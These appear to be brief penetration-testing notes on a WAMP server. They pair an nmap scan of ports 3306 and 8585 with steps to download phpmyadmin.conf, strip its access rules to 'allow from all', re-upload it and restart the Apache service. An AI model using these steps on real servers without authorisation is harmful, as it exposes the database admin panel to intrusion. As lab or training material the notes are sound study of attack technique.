nmap -sV -sC -p 3306,8585 <IP>

**Files for config and web apps hosted on wamp are typically found in C:\wamp or C:\wamp\www**

download phpmyadmin.conf
**edit this file and remove the rules and allow from all**
upload phpmyadmin.conf
**for any changes to take effect the wampapache service needs to be restarted**
